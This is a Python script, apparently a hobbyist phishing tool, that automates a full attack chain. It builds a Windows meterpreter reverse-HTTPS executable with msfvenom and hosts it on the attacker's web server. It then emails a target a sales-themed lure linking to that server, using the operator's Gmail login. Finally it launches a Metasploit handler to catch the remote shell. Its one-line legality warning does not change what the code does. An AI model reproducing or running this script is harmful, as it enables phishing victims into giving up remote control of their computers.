import smtplib
import subprocess
import asyncio
import getpass
# instruction
def showInstruction():
    print('this app is made to check phashing attacks in production  warring: attacking is not legal')
    print('your email and password is requierd to send the code into the target')
    print('the receiver email is the target email which your wish to check out ')
    print('')
    print('')
    print('--------------------------------------------')


showInstruction()

# creathing payload with msfvenom
def createPayload():
    try:
           print('')
           print('')
           print('creating payload................')
           msfvenomprocess = subprocess.Popen(['sudo', 'msfvenom',
                                        '-p' 'windows/meterpreter/reverse_https'
                                           ,'LHOST=172.20.10.2' ,'LPORT=443','-f', 'exe'
                                           ,'-o' , '/var/www/html/payload.exe'],
                               stdout=subprocess.PIPE,
                               stderr=subprocess.PIPE)
           stdout, stderr = msfvenomprocess.communicate()
           print('the payload is created and stored in /var/www/html/payload.exe')
           print('')
           print('')
           print('--------------------------------------------')
    except Exception as ex:
        print('semothing wrong when creating payload', ex)

createPayload()

# creating send email with payload
def sendEmailToTarget():
    print('')
    print('')
    gmail_user = input('inter your email ')
    gmail_password = getpass.getpass('Password:')
    receiver_email = input('inter receiver email ')

    sent_from = gmail_user
    to = [receiver_email]
    subject = 'get to our site to see our best sales'
    body = 'http://172.20.10.2'

    email_text = """\
    From: %s
    To: %s
    Subject: %s

    %s
    """ % (sent_from, ", ".join(to), subject, body)

    try:
        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        smtp_server.ehlo()
        smtp_server.login(gmail_user, gmail_password)
        smtp_server.sendmail(sent_from, to, email_text)
        smtp_server.close()
        print("Email sent successfully!")
        print('')
        print('')
        print('--------------------------------------------')
    except Exception as ex:
        print("Something went wrong….", ex)
        pass


sendEmailToTarget()
# creating lissener with mfsconsole
async def createLissener():
    try:
          print('creating lisenner ...................')
          cmd ='msfconsole -qx " use exploit/multi/handler; ' \
               'set payload windows/meterpreter/reverse_https;' \
               'set lhost 172.20.10.2;set lport 443;run;"'
          proc = await asyncio.create_subprocess_shell(
              cmd)
          print('please wait....................')
          stdout, stderr = await proc.communicate()
    except Exception as ex:
        print('something wrong when trying create lissener' ,ex)

asyncio.run(createLissener())

